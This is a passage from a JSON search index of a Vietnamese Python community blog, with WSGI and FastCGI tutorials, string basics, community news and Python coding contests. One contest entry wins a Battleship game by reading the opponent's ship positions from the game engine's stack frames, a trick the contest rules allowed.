tham khảo khác. Gói này cung cấp dịch vụ lập lịch tương tự như Quartz trong thế giới Java.","tags":"Bài viết","title":"Lập lịch gọi hàm với Gevent"},{"url":"2011/08/lap-trinh-web-voi-python-7.html","text":"Trong bài cuối của loạt bài Lập trình web với Python, chúng ta sẽ bàn đến chuẩn WSGI (Web Server Gateway Interface). WSGI, khác với HTTP, CGI và FCGI, không phải là chuẩn giao thức liên lạc (communication protocol) mà là chuẩn giao tiếp (standard interface) giữa ứng dụng máy chủ (server) và các khung xương (framework) hay các ứng dụng web (web application). Hình tượng hóa mà nói, WSGI nằm phía trên HTTP/CGI/FCGI và phía dưới ứng dụng thật sự. Lớp WSGI giúp lớp ứng dụng trao đổi với lớp máy chủ theo một cách khả chuyển, tức là một ứng dụng WSGI có thể chạy như nhau trên máy chủ khác nhau như Apache, NGINX, hay Lighttpd, sử dụng các giao thức khác nhau như CGI, FCGI, SCGI, hay AJP. Nói một cách khác, WSGI \"che\" cách liên lạc qua mạng và tạo điều kiện cho ứng dụng web tập trung vào việc xử lý các vấn đề quan trọng hơn. Một ứng dụng WSGI là một đối tượng gọi được (callable object). Một đối tượng gọi được có thể là một hàm, một phương thức, hoặc một đối tượng có hàm __call__ . Đối tượng gọi được này phải nhận hai tham số là environ và start_response . Tham số environ là một từ điển với các khóa theo chuẩn CGI và một số khóa đặc biệt mà máy chủ WSGI có thể truyền cho ứng dụng. start_response là một đối tượng gọi được do máy chủ WSGI cung cấp cho ứng dụng để ứng dụng bắt đầu việc truyền dữ liệu cho máy chủ WSGI. start_response nhận hai tham số là dòng trạng thái trả lời (status string) và một danh sách bộ-2 (list of 2-tuple) các đầu mục (header), mỗi bộ-2 bao gồm tên và giá trị của đầu mục. Giá trị trả về của ứng dụng WSGI là một bộ khả lặp (iterable) sinh ra nội dung sẽ được máy chủ WSGI truyền lại cho máy chủ HTTP hoặc trình duyệt. Ví dụ: def simple_app ( environ , start_response ): \"\"\"Simplest possible application object\"\"\" status = '200 OK' response_headers = [( 'Content-type' , 'text/plain' )] start_response ( status , response_headers ) return [ 'Hello world! \\n ' ] Đầu tiên, ta thiết lập chuỗi trạng thái là 200 OK , xác định đầu mục Content-type là text/plain rồi gọi start_response với các thông tin như vậy. Giá trị trả về là một danh sách với phần tử duy nhất là chuỗi Hello world!n . Ta cũng có thể trả về chuỗi Hello world! trực tiếp mà không cần đặt nó vào trong một danh sách vì bản thân một chuỗi cũng là một đối tượng khả lặp. Tuy nhiên, làm như vậy không được khuyến khích vì khi đó máy chủ WSGI sẽ phải làm việc nhiều hơn, lặp qua từng ký tự H, e, l, l, o... thay vì lấy thẳng chuỗi trả lời. Chúng ta sẽ viết lại ứng dụng đếm số lần truy cập như trong kỳ trước theo dạng một ứng dụng WSGI. Chúng ta sẽ tạo tập tin C:Program FilesApache Software FoundationApache2.2fcgi-binhello2.py với nội dung như sau: #!C:\\Python26\\python.exe from flup.server import fcgi class HelloApp ( object ): def __init__ ( self ): self . count = 0 def __call__ ( self , environ , start_response ): self . count += 1 start_response ( '200 OK' , [( 'Content-type' , 'text/plain' )]) return [ 'Hello WSGI World %d ' % self . count ] if __name__ == \"__main__\" : webapp = HelloApp () fcgi . WSGIServer ( webapp , bindAddress = ( \"localhost\" , 8888 )) . run () Thực thi ứng dụng này với lệnh python hello2.py , chạy máy chủ Apache với các thiết lập đã làm trong bài viết kỳ trước, và truy cập vào địa chỉ http://localhost/fcgi-bin/hello.py thì chúng ta sẽ thấy hình như sau: Khi làm tươi trình duyệt thì chúng ta nhận được hình sau: So sánh ứng dụng viết theo WSGI và ứng dụng viết theo các giao thức CGI, hay FCGI ta thấy rõ rằng ứng dụng WSGI không cần quan tâm đến việc dữ liệu sẽ được truyền cho trình duyệt bằng cách nào. Ứng dụng WSGI chỉ quan tâm đến việc tạo ra dữ liệu gì và đẩy chỗ dữ liệu đó cho lớp WSGI bên dưới. Lớp này sẽ tự động thực hiện việc truyền tới trình duyệt theo cách tốt nhất có thể. Tuy nhiên, ứng dụng WSGI cũng phải biết rõ cách hoạt động của máy chủ WSGI. Ví dụ, một ứng dụng WSGI chạy trên máy chủ WSGI theo mô hình CGI thì sẽ không thể trông chờ đến việc sử dụng lại biến toàn cục vì mỗi yêu cầu được một tiến trình riêng xử lý. Đồng thời ứng dụng WSGI cũng phải đảm bảo rằng các chuỗi trả về phải là chuỗi byte (byte string) và không được sử dụng chuỗi unicode (unicode string). Lý do là vì giao thức HTTP không hiểu unicode. Do đó, tốt nhất là ứng dụng WSGI nên gọi encode trên các chuỗi unicode để chuyển các chuỗi unicode thành các chuỗi byte trước khi đưa xuống cho máy chủ WSGI. Một điểm hay của giao tiếp WSGI là một ứng dụng WSGI có thể gói (wrap) một ứng dụng WSGI khác bên trong. Điều này cho phép chúng ta tạo ra các ứng dụng WSGI hoạt động như các phần giữa (middleware), hoặc bộ lọc (filter). Ví dụ: def simple_app ( environ , start_response ): \"\"\"Simplest possible application object\"\"\" status = '200 OK' response_headers = [( 'Content-type' , 'text/plain' )] start_response ( status , response_headers ) return [ 'Hello world! \\n ' ] def real_app ( environ , start_response ): r = simple_app ( environ , start_response ) return [ 'Tag! \\n ' ] + r Với đoạn mã trên, ứng dụng real_app đã gói ứng dụng simple_app và chèn vào một chuỗi Tag!n phía trước những gì mà simple_app gửi về. Đây là một cách để tạo nên các ứng dụng web lớn từ việc ghép các ứng dụng web nhỏ lại với nhau. Chúng ta dừng loạt bài Lập trình web với Python tại đây. Sau 7 bài viết ngắn gọn (nhưng diễn ra trong một khoảng thời gian dài), chúng ta đã xem xét qua việc cài đặt Apache, và Python, rồi các giao thức nền tảng như HTTP, CGI. Từ đó, chúng ta bàn đến các giao thức hiện đại hơn, có một số ưu điểm tốt như FCGI với ví dụ đếm số lần truy cập. Cuối cùng chúng ta dừng lại với một thảo luận ngắn về giao tiếp WSGI, là giao tiếp phổ thông nhất để viết ứng dụng web trong thế giới Python. Tôi hy vọng sẽ gặp bạn đọc trong các bài viết khác. Để thảo luận về loạt bài này, bạn có thể sử dụng diễn đàn .","tags":"Bài viết","title":"Lập trình web với Python (7)"},{"url":"2011/08/vithon-nang-cap-su-dung-gevent.html","text":"Suốt thời gian qua, nhóm PCNV đã sử dụng chế độ CGI để chạy các ứng dụng web và vẫn đảm bảo được việc truy cập của các bạn quan tâm đến ngôn ngữ Python. Tuy nhiên, để tránh các vấn đề kỹ thuật có thể phát sinh khi số lượng thành viên tăng lên, cũng như do đòi hỏi của một số tính năng trên diễn đàn, nhóm PCNV đã chuyển hai ứng dụng web là Zine và Vithon Forum qua chạy cùng Gevent, tận dụng chế độ trao đổi không đồng bộ. Việc chuyển đổi này hy vọng sẽ khiến tốc độ truy cập được cải tiến đáng kể. Nếu các bạn gặp trục trặc trong việc truy cập vào trang PCNV và diễn đàn, thì các bạn hãy thông báo cho chúng tôi theo thông tin liên lạc ở đầu trang.","tags":"Tin tức","title":"Vithon nâng cấp sử dụng Gevent"},{"url":"2011/07/lap-trinh-web-voi-python-6.html","text":"Phần trước chúng ta đã xem xét mô hình hoạt động của một ứng dụng FCGI. Trong phần này chúng ta sẽ viết thử một chương trình FCGI như đã đề cập. Trước tiên, chúng ta sẽ cần cài đặt thư viện flup của tác giả Allan Saddi. Làm việc này khá đơn giản, chúng ta chỉ việc tải tập tin ez_setup.py từ địa chỉ http://peak.telecommunity.com/dist/ez_setup.py về một nơi nào đó trên máy, ví dụ như C:Python26Scripts . Sau đó chúng ta sẽ gọi lệnh ở màn hình DOS như sau: C:\\>c:\\Python26\\scripts\\ez_setup.py flup Gói flup sẽ được cài đặt trong C:Python26libsite-packages . Ở bước 2, chúng ta sẽ tải về tập tin http://www.fastcgi.com/dist/mod_fastcgi-2.4.6-AP22.dll , đổi tên nó thành mod_fastcgi.dll và đặt nó trong C:Program FilesApache Software FoundationApache2.2modules . Kế tiếp bước 3, chúng ta sẽ cần cấu hình Apache thành một FCGI client . Chúng ta cần sửa tập tin httpd.conf để thêm vào các dòng sau ở dưới cùng: LoadModule fastcgi_module modules/mod_fastcgi.dll Alias \"/fcgi-bin/hello.py\" \"C:/Program Files/Apache Software Foundation/Apache2.2/fcgi-bin/hello.py\" <Directory \"C:/Program Files/Apache Software Foundation/Apache2.2/fcgi-bin/\"> Order allow,deny Allow from all </Directory> FastCgiExternalServer \"C:/Program Files/Apache Software Foundation/Apache2.2/fcgi-bin/hello.py\" -host localhost:8888 Dòng LoadModule bảo Apache nạp mô-đun mod_fastcgi mà chúng ta vừa làm ở bước 2. Dòng Alias cho Apache biết rằng mọi yêu cầu đến đường dẫn (URI) /fcgi-bin/hello.py thật chất là đến tập tin C:/Program Files/Apache Software Foundation/Apache2.2/fcgi-bin/hello.py . Chúng ta cần dòng này bởi vì hello.py sẽ được tạo ở ngoài DocumentRoot . Cũng chính vì thư mục fcgi-bin không nằm trong DocumentRoot nên chúng ta cũng cần lệnh Directory để cho phép Apache phục vụ những yêu cầu truy cập vào thư mục đó. Và cuối cùng lệnh FastCgiExternalServer bảo Apache rằng tập tin hello.py thật chất là một ứng dụng FCGI đã được chạy sẵn tại địa chỉ localhost ở cổng 8888 . Chính câu lệnh này sẽ chuyển Apache thành một FCGI client , chuyển tiếp yêu cầu từ trình duyệt đến FCGI server do chúng ta phát triển. Vì chúng ta đang cài đặt trên Windows nên chúng ta chỉ có một lựa chọn là sử dụng FCGI theo chế độ trao đổi qua socket, do đó chúng ta phải dùng FastCgiExternalServer . Bước 4 là tạo tập tin hello.py trong thư mục C:/Program Files/Apache Software Foundation/Apache2.2/fcgi-bin . Nếu chưa có thư mục này, bạn đọc hãy tự tạo ra nó. Tập tin hello.py sẽ có nội dung như sau: #!C:\\Python26\\python.exe from flup.server import fcgi count = 0 class HelloApp ( fcgi . WSGIServer ): def handler ( self , req ): global count count += 1 req . stdout . write ( 'Content-Type: text/plain \\n ' ) req . stdout . write ( ' \\n ' ) req . stdout . write ( 'Hello World %d ' % count ) if __name__ == \"__main__\" : HelloApp ( application = None , bindAddress = ( \"localhost\" , 8888 )) . run () Trước hết, chúng ta nhập mô-đun flup.server.fcgi . Kế tiếp chúng ta khai báo một biến đếm tên count với giá trị khởi tạo là 0 . Sau đó chúng ta khai báo ứng dụng của chúng ta bằng cách định nghĩa lớp HelloApp kế thừa lớp WSGIServer trong mô-đun flup.server.fcgi . HelloApp sẽ định nghĩa lại hàm handler để xử lý các yêu cầu nhận được. Hàm handler nhận vào một tham số đó là đối tượng req chứa thông tin về các biến môi trường, các dòng dữ liệu chuẩn như stdin , stdout . Chúng ta sẽ cộng một vào biến đếm toàn cục, và xuất giá trị này ra lại cho trình duyệt. Như một ứng dụng CGI (FCGI) thông thường, trước hết chúng ta cần phải xác định kiểu dữ liệu trả về thông qua Content-Type , theo sau bởi một dòng trống đánh dấu sự chấm dứt các đầu đề (header) và bắt đầu của nội dung, và cuối cùng là nội dung. Hai dòng lệnh cuối chỉ đơn giản là chạy ứng dụng FCGI này ở địa chỉ localhost và cổng 8888 . Để kiểm tra, chúng ta sẽ cần thực hiện ba việc: chạy ứng dụng hello.py , chạy Apache , và dùng trình duyệt xem trang http://localhost/fcgi-bin/hello.py . Để chạy ứng dụng hello.py chúng ta chỉ cần nhập lệnh sau ở màn hình DOS: c:\\Program Files\\Apache Software Foundation\\Apache2.2\\fcgi-bin>python hello.py Khi dùng trình duyệt vào xem trang web như trên thì chúng ta sẽ nhận được hình sau: Nếu làm tươi trình duyệt thì chúng ta sẽ thấy giá trị đếm tăng lên: Như vậy chứng tỏ rằng các yêu cầu đều được phục vụ bởi một tiến trình duy nhất. Đây chính là lợi điểm của FCGI so với CGI. Trong bài sau, chúng ta sẽ xem xét cách phát triển ứng dụng web với WSGI.","tags":"Bài viết","title":"Lập trình web với Python (6)"},{"url":"2011/03/lap-trinh-web-voi-python-5.html","text":"Bẵng một thời gian, chúng ta lại quay lại với loạt bài Lập trình web với Python. Trong kỳ này, chúng ta sẽ bàn đến mô hình FastCGI (FCGI). Cái tên FCGI khiến người ta liên tưởng đến mô hình CGI như đã trình bày trong kỳ trước. Nhưng, thật tế là FCGI là một mô hình rất khác so với CGI. Các ứng dụng FCGI là các ứng dụng bền , tức là một tiến trình FCGI có thể phục vụ nhiều yêu cầu chứ không phải chỉ một yêu cầu như ứng dụng CGI. Do đó, các ứng dụng FCGI có thể sử dụng các biến có phạm vi ứng dụng (application-scoped variable, tương đương với các biến toàn cục, global variable), tồn tại qua nhiều yêu cầu. Xét ví dụ một chương trình web hiển thị số lần truy cập vào trang. Với mô hình CGI , khi có yêu cầu gửi đến, máy chủ web (web server, httpd) sẽ tạo một tiến trình khác, chạy chương trình CGI, chương trình này khởi tạo biến đếm với giá trị 0, tăng nó lên 1, và hiển thị số 1 rồi tiến trình kết thúc. Khi có yêu cầu thứ hai đến, máy chủ lại tạo một tiến trình khác, chạy chương trình CGI, chương trình này khởi tạo biến đếm với giá trị 0, tăng nó lên 1, và hiển thị số 1, và kết thúc tiến trình. Như vậy, vì mỗi yêu cầu được một tiến trình riêng phục vụ nên chúng ta sẽ cần phải lưu biến đếm vào một tài nguyên ngoài (ví dụ như tập tin, hoặc cơ sở dữ liệu), và các tiến trình truy cập vào cùng tài nguyên này. Với mô hình FCGI , một tiến trình FCGI sẽ được chạy trước. Chương trình này được gọi là một FCGI server . Chương trình này khởi tạo biến đếm với giá trị 0 và bước vào một vòng lập vô tận để nhận yêu cầu. Trình duyệt gửi yêu cầu đến máy chủ web. Khi này máy chủ web sẽ chuyển yêu cầu này đến ứng dụng FCGI đã được chạy trước đó. Như vậy, máy chủ web đóng vai trò là một FCGI client . Ở phía FCGI server, yêu cầu được chấp nhận (accept), biến đếm được tăng lên thành 1, kết quả trả về lại cho httpd, và FCGI server quay lại vòng lập nhận yêu cầu. Máy chủ web trả lại kết quả cho trình duyệt. Khi có yêu cầu kế tiếp, máy chủ httpd lại chuyển yêu cầu đó cho cùng FCGI server. Yêu cầu này được chấp nhận, biến đếm được tăng thành 2 vì đang trong cùng một tiến trình, kết quả trả về lại cho httpd và tiếp tục như đã bàn. Vì mô hình hoạt động của FCGI khác với CGI nên việc trao đổi giữa FCGI client và FCGI server (giữa httpd và ứng dụng FCGI) không thể sử dụng cùng một giao thức đơn giản như ứng dụng CGI nữa. Việc này đòi hỏi một giao thức riêng cho FCGI. Mô hình hoạt động đơn giản của FCGI được miêu tả trong hình dưới. Ngoài lợi ích về tốc độ (do không phải tạo tiến trình mới để phục vụ mỗi yêu cầu, và khả năng chia sẻ tài nguyên thông qua biến có phạm vi ứng dụng), các ứng dụng FCGI còn có thể được triển khai trên hệ thống khác với hệ thống máy chủ web, giúp cho việc phân bổ tài nguyên giữa httpd và FCGI server được hiệu quả hơn. FCGI hỗ trợ hai cách giao tiếp là thông qua stream pipe , và thông qua socket . Cách giao tiếp stream pipe tương tự như việc gửi và nhận dữ liệu qua stdin , và stdout . Cách giao tiếp này được sử dụng cho các ứng dụng FCGI triển khai trên cùng hệ thống với httpd. Cách giao tiếp socket sử dụng một kết nối TCP để đóng gói và gửi dữ liệu của env-vars , stdin , stdout , và stderr tới ứng dụng FCGI. Điều này cho phép ứng dụng FCGI được triển khai trên một hệ thống khác, và httpd sẽ liên lạc với ứng dụng này dựa vào kết nối mạng TCP. Do đó, việc tối ưu tài nguyên hệ thống có thể được thực hiện dễ dàng hơn so với ứng dụng CGI. Đối với ứng dụng FCGI, FCGI server có thể được chạy trong chế độ đa tiến trình, hoặc đa tiểu trình đều được. FCGI server có thể được chạy trên một máy 8 lõi, trong khi httpd chạy trên một máy khác đơn nhân. FCGI server phục vụ các dữ liệu động, trong khi httpd phục vụ các dữ liệu tĩnh như hình ảnh, trang web tĩnh. Chúng ta vừa xem qua mô hình hoạt động của FCGI. Đi sâu hơn vào cấu trúc từng ứng dụng FCGI thì dúng ta có ba phần chính sau: Mã khởi tạo Vòng lặp nhận yêu cầu Xử lý yêu cầu và trả kết quả Trong ví dụ về ứng dụng hiển thị số lượt truy cập, mã khởi tạo là việc khởi tạo biến đếm toàn cụ với giá trị 0. Vòng lặp nhận yêu cầu thường là một vòng lặp vô hạn, tương tự như: while True : fcgi_accept () # xử lý yêu cầu như CGI Trong khi yêu cầu được chấp nhận, thì dữ liệu nhập cũng được tách ra thành env-vars , stdin , stdout , và stderr . Điều này khiến cho việc xử lý yêu cầu của một ứng dụng FCGI không khác bao nhiêu so với việc xử lý của một ứng dụng CGI. Tất cả đều được thực hiện trên các biến môi trường, và các luồng chuẩn. Điều khác biệt đó là sau khi xử lý xong yêu cầu thì ứng dụng FCGI lại quay lại vòng lặp nhận yêu cầu mà không chấm dứt tiến trình như một ứng dụng CGI. Vì không phải chấm dứt tiến trình sau mỗi yêu cầu nên các tiến trình FCGI có thể được \"sử dụng lại\". Một ứng dụng FCGI có thể được khởi tạo trước, với 10 tiến trình chẳng hạn, và đặt trong một bể (pool) tiến trình sẵn sàng. Khi có yêu cầu đến, thì máy chủ web có thể ngay lập tức lấy ra một tiến trình từ bể này, và gửi thông tin đến nó. Khi kết thúc xử lý yêu cầu, máy chủ web lại đưa tiến trình này vào bể. Việc khởi tạo trước tiết kiệm được thời gian khởi tạo ban đầu, nhưng sẽ chiếm bộ nhớ, ngay cả khi chưa có yêu cầu nào được nhận. Sau đây là mô hình chi tiết của một ứng dụng FCGI. Hẹn gặp các bạn vào bài tới. Chúng ta sẽ viết thử một ứng dụng FCGI đơn giản với mô-đun fcgi của Allan Saddi .","tags":"Bài viết","title":"Lập trình web với Python (5)"},{"url":"2011/03/thomas-heller-ra-di.html","text":"Ngày 19 tháng 03, Thomas Heller đã tự đề nghị nhóm phát triển Python tước quyền cập nhật của ông. Thomas Heller là tác giả gói ctypes , được sử dụng rất nhiều trong việc kết nối Python với các thư viện ngoài. Thomas ra đi vì không còn nhiều thời gian để cập nhật ctypes nữa. Và điều đó để lại một lỗ hổng to trong việc duy trì, sửa lỗi mô-đun quan trọng này.","tags":"Tin tức","title":"Thomas Heller ra đi"},{"url":"2011/02/hoi-thao-pycon-chau-a-thai-binh-duong-2011.html","text":"Hội thảo PyCon APAC 2011 đã mở cửa kêu gọi bài đăng ký. Để biết thêm chi tiết và gửi bài tham gia, hoặc đăng ký dự, các bạn hãy vào trang http://apac.pycon.org/ . PCNV là một trong các nhóm hỗ trợ hội thảo.","tags":"Tin tức","title":"Hội thảo PyCon Châu Á Thái Bình Dương 2011"},{"url":"2011/02/lam-viec-voi-string-python-3.html","text":"So sánh cơ bản: >>> A = \"caulacbopython\" >>> B = \"pythonviet\" >>> print ( A == B ) False >>> print ( A > B ) False >>> print ( A < B ) True Ghép chuỗi: >>> A = \"Yeu\" >>> B = \"Python\" >>> A + B 'YeuPython' Split: Hiểu nôm na, ta có một cái chuỗi dài. Giờ ta sẽ cắt nó thành nhiều khúc dài dài và sử dụng khúc nào đó thì tùy: >>> A = \"Cau-Lac-Bo-Python-Viet\" >>> B = A . split ( '-' ) >>> B ['Cau', 'Lac', 'Bo', 'Python', 'Viet'] >>> B [ 0 ] 'Cau' >>> B [ 1 ] 'Lac' >>> B [ 2 ] 'Bo' Lấy 1 ký tự bất kì: >>> chuoi = \"NguyenMinhThe\" >>> print ( chuoi [ 2 ]) u >>> print ( chuoi [ 1 ]) g Thay thế (Replace): >>> chuoi = \"MinhThe\" >>> print ( chuoi . replace ( 'h' , 'H' )) >>> 'MinHTHe' Đếm số lần xuất hiện ký tự trong 1 chuỗi: >>> ch = \"VithonViet\" >>> print ( ch . count ( 'V' )) 2 Trích từ bài gửi diễn đàn của Nguyễn Minh Thế .","tags":"Bài viết","title":"Làm việc với String (Python 3)"},{"url":"2010/12/ket-qua-100-phat-100-trung.html","text":"Để tóm gọn và đỡ tốn thời gian, giải thưởng thuộc về Nhâm Xuân Nam (cũng là người thắng giải http://www.vithon.org/2010/06/03 /kết-quả-cuộc-thi-giải-toan-bằng-python). Sau đây là bài fire_in_the_hole.py của Nhâm Xuân Nam: ''' Created on Dec 15, 2010 @author: namnx ''' import entity import random import inspect class HolePlayer ( entity . Player ): def name_ship ( self , ship ): n = repr ( ship . __class__ ) return n [ n . index ( '.' ) + 1 : - 2 ] def on_hit ( self , x , y ): # dont care pass def orient_ship ( self , ship ): return entity . HORIZONTAL def place_ship ( self , ship ): while True : x = random . randint ( 0 , self . ocean . width - 1 ) y = random . randint ( 0 , self . ocean . height - 1 ) if not self . t_ocean : self . t_ocean = entity . Ocean ( self . ocean . width , self . ocean . height ) try : ship . place ( self . t_ocean , x , y ) return ( x , y ) except ValueError : pass def lock_missile ( self , ship ): opponent_ships = self . get_opponent_ships () if self . step < 4 : if ship . __class__ == entity . Destroyer : for s in opponent_ships : if ( s . __class__ == ship . __class__ ) and ( s . orientation == ship . orientation ): break self . step += 1 return ( s . x , s . y ) for s in opponent_ships : if s . __class__ == ship . __class__ : break ; self . step += 1 return ( s . x , s . y ) else : for s in opponent_ships : if s . __class__ == entity . MissileCruiser : break if ship . __class__ == entity . MissileCruiser : if s . orientation == entity . HORIZONTAL : return ( s . x - 2 , s . y ) else : return ( s . x , s . y - 2 ) else : if s . orientation == entity . HORIZONTAL : return ( s . x + 2 , s . y ) else : return ( s . x , s . y + 2 ) def get_opponent_ships ( self ): frames = inspect . stack () for frame in frames : if frame [ 3 ] == '__turn' : break ; gameObj = frame [ 0 ] . f_locals [ 'self' ] for i in range ( len ( gameObj . players )): if gameObj . players [ i ] . __class__ != self . __class__ : break return gameObj . ships [ i ] def entry ( name ): p = HolePlayer ( name ) p . t_ocean = None p . step = 0 return p Xin chúc mừng bạn Xuân Nam.","tags":"Tin tức","title":"Kết quả 100 phát 100 trúng"},{"url":"2010/12/giai-phu-bach-phat-bach-trung.html","text":"Cuộc tranh tài Bắn Suồng tuy đã kết thúc nhưng dư âm (và cả bao nỗi niềm ấm ức, tức tưởi) của nó vẫn còn vấn vương trong tâm trí các bạn tham gia. Vì vậy, mình xin đề nghị một giải phụ của Bắn Suồng với thể lệ như sau: Nếu bạn tạo được một suồng \"bách phát bách trúng\", mình sẽ tặng áo với chữ ký của người sáng lập nhóm PCNV. Điều này cũng có nghĩa là có thể có nhiều hơn một bài thắng giải. \"Bách phát bách trúng\" được hiểu theo nghĩa một phát bắn phải trúng ít nhất một tàu. Bạn có thể sử dụng mọi kỹ thuật (mũ đen hay trắng) để làm việc này. Thời hạn nhận bài là hết ngày 19 tháng 12 năm 2010. Bài tham gia phải sử dụng ngôn ngữ Python làm ngôn ngữ chính, và nộp mã nguồn. Bài tham gia gửi về cho admin+thư+rác@vithon.org (nhớ bỏ phần chống spam phía sau nhé). Mình xin giữ toàn quyền quyết định kết quả. Chúc may mắn.","tags":"Tin tức","title":"Giải phụ bách phát bách trúng"},{"url":"2010/12/ket-qua-ban-suong.html","text":"Ngày hôm qua tại Đại học RMIT, nhóm PCNV đã tổ chức thi Bắn Suồng trực tiếp (cùng với việc truyền hình trực tiếp) cuộc tranh tài Bắn Suồng. Kỳ thi này nhận được bốn bài tham dự: fire_sheep , checker , randome , và bibo . Tuy nhiên, bài bibo vì gửi vào 0152 sáng 12/12 nên đã bị loại. Kết quả trận tranh tài căng thẳng, và đầy hồi hộp (lẫn may mắn) là: fire_sheep thắng checker fire_sheep thua randome checker thua randome Như vậy, \"suồng\" randome đã đăng quang vô địch kỳ thi lần này. Tác giả của randome , không ai khác, chính là tác giả của tin này :-D. Hẹn gặp các bạn vào những kỳ thi thú vị tới. Tái bút: Mã nguồn của Bắn Suồng và các bài tranh tài có thể được tải về tại http://www.vithon.org/static/ban-suong.zip .","tags":"Tin tức","title":"Kết quả Bắn Suồng"},{"url":"2010/11/tranh-tai-ban-suong.html","text":"Cập nhật: Phiên bản battleship.zip cũ có lỗi. Các bạn tải về bản mới hoặc sửa dòng player2_mod = __import__(opts.player_1) thành player2_mod = __import__(opts.player_2) . Xin cáo lỗi vì sự phiền toái này. Nhóm PCNV hân hạnh tổ chức một cuộc thi mới: Tranh tài Bắn Suồng! Bắn Suồng (xin lỗi vì sai chính tả, nhưng để giữ chữ viết tắt BS nên tôi đành phải đặt tên trò chơi là vậy) không phải là một trò chơi thông thường. Để chơi trò chơi này, các bạn phải viết mã bằng ngôn ngữ... (cho xin 500 đồng trống và kèn cho hào hứng tí nào) Python để điều khiển các đối tượng trong trò chơi. Các bạn có thể tải trò chơi về tại địa chỉ http://www.vithon.org/static/battleship.zip . Cuộc thi Bắn Suồng được tổ chức với thể lệ như sau: Mô-đun (các tập tin .py ) tham gia phải gửi về cho admin+thư-rác@vithon.org (bỏ phần + thư rác) trước ngày 12 tháng 12 năm 2010. Các bài thi này sẽ được kiểm tra trước khi được chấp nhận cho thi. Các bài tham dự sẽ đấu vòng tròn tính điểm. Thắng sẽ được 3 điểm, hòa được 1, và thua được 0 điểm. Các trận đấu sẽ được truyền hình (qua web) trực tiếp vào ngày 12 tháng 12. Vùng biển sẽ có kích thước ngẫu nhiên với độ rộng và dài tối thiểu là 10, và tối đa là 15. Một giải nhất sẽ nhận được 01 chiếc áo Vithon miễn phí, và có thể mua thêm 01 chiếc áo khác với giá ưu đãi 100.000 ! Quyết định của ban tổ chức là cuối cùng. Xin được phép không nhận khiếu nại. Để trao đổi về cuộc thi này, cũng như các vấn đề liên quan đến lập trình Python, các bạn có thể sử dụng diễn đàn của nhóm hoặc liên hệ qua IRC. Nhóm PCNV rất mong nhận được sự tham gia nhiệt tình của các bạn.","tags":"Tin tức","title":"Tranh tài Bắn Suồng"},{"url":"2010/11/ao-vithon-thanh-pham.html","text":"Sau một số trục trặc không lường trước, nhóm PCNV cũng đã nhận được áo Vithon thành phẩm từ nhà in. Nhóm xin được hân hạnh giới thiệu với các bạn một số ảnh chụp áo thật sau: Mặt trước Mặt sau Nhóm PCNV xin cảm ơn nhóm mẫu Mập Ốm đã mua ủng hộ hai chiếc áo cỡ L và S để tạo ra được hai bức hình đẹp \"rạng ngời\" này. Một số người đã mặc áo đa số đều có chung nhận định áo mặc thoải mái lắm . Áo sẽ được bán với giá 185.000 đồng cho những người đang đi làm, và 150.000 đồng cho các bạn học sinh, sinh viên đại học trở xuống. Tại TPHCM, mong các bạn ghé địa chỉ 224 Nguyễn Thái Bình, phường 12, quận Tân Bình, trong giờ làm việc từ thứ hai đến thứ sáu mỗi tuần. Các bạn ở tỉnh khác xin vui lòng liên lạc với nhóm PCNV. Áo Vithon cũng sẽ được sử dụng làm giải thưởng cho những kỳ thi sắp tới của nhóm PCNV. Mong các bạn hăng hái tham gia giựt giải.","tags":"Tin tức","title":"Áo Vithon thành phẩm"},{"url":"2010/09/gioi-thieu-ao-cua-nhom-pcnv.html","text":"Trong mấy tuần vừa qua, nhóm PCNV đã huy động toàn bộ sức lực để hoàn thành mẫu thiết kế áo thun chính thức của nhóm. Xin hân hạnh giới thiệu cùng các bạn thiết kế đầy ấn tượng này. Mặt trước Mặt sau Hiện áo đang được đưa đi in với số lượng 50 chiếc. Nếu bạn có nhu cầu muốn đặt mua áo thì vui lòng liên lạc với nhóm PCNV trong diễn đàn , hoặc qua kênh IRC #vithon ở máy chủ irc.freenode.net ( http://webchat.freenode.net ). Giá dự tính của mỗi chiếc áo sẽ ít hơn một trăm năm mươi nghìn đồng . Do số lượng có hạn nên áo sẽ được phân phát theo phương thức nhanh tay thì còn . Nhóm PCNV không chịu trách nhiệm nếu người mặc áo bị các lập trình viên khác gây chuyện! Nhóm PCNV trân trọng cảm ơn công sức thâu đêm suốt sáng nhiều tuần liền của các thành viên năng nổ sau: Kịch bản Hoàng Quốc Thịnh Đạo diễn Nguyễn Thành Nam Hiệu ứng Lê Ngọc Hiếu Sản xuất Phan Đắc Anh Huy Chỉ đạo nghệ thuật Tập thể diễn viên hài PCNV Chúc các bạn vui vẻ!","tags":"Tin tức","title":"Giới thiệu áo của nhóm PCNV"},{"url":"2010/07/cuoc-thi-viet-chuong-trinh-theo-doi-ma-may.html","text":"Một người bạn của chúng ta đã có nhã ý tài trợ cho một cuộc thi nhỏ. Mục tiêu: Viết một công cụ bằng ngôn ngữ Python để thực hiện việc lưu lại những lệnh gọi hàm ở mức hợp ngữ trong khi thực thi của một chương trình thông thường khác. Ví dụ: Với đoạn mã tương tự như sau: 0 x08048552 < main + 110 > : mov DWORD PTR [ esp ], eax 0 x08048555 < main + 113 > : call 0x80483d8 < printf@plt > 0 x0804855a < main + 118 > : mov eax , 0x0 0 x0804855f < main + 123 > : leave 0 x08048560 < main + 124 > : ret thì chương trình sẽ in ra thông tin tương tự (có thể tùy ý chỉnh sửa cho đầy đủ hơn) như sau: * Before printf () --------------------------------------------------------------------------[ regs ] EAX: 0 x08048646 EBX : 0x002B2FF4 ECX : 0x00000003 EDX : 0xBFFFEF9C ESI: 0 x00000000 EDI : 0x00000000 EBP : 0xBFFFF0A8 ESP : 0xBFFFEF80 * After printf () --------------------------------------------------------------------------[ regs ] EAX: 0 x0000000A EBX : 0x002B2FF4 ECX : 0xBFFFEF68 EDX : 0x002B4320 ESI: 0 x00000000 EDI : 0x00000000 EBP : 0xBFFFF0A8 ESP : 0xBFFFEF80 Yêu cầu: Bắt buộc phải sử dụng ngôn ngữ Python cho chương trình chính. Có thể sử dụng thêm các công cụ phụ hoặc thư viện hỗ trợ như GDB, ptrace. Hạn nộp bài: Ngày 26 tháng 07 năm 2010 Nộp bài (mã nguồn) về cho admin+frontpage@vithon.org (xin vui lòng bỏ +frontpage). Giải thưởng: Một giải thưởng duy nhất bao gồm 100.000 đồng tiền mặt và một món quà từ Las Vegas.","tags":"Tin tức","title":"Cuộc thi viết chương trình theo dõi mã máy"},{"url":"2010/07/gioi-thieu-phan-mem-vithon-forum.html","text":"Nhóm Python Cho Người Việt (PCNV) hân hạnh công bố phần mềm Vithon Forum 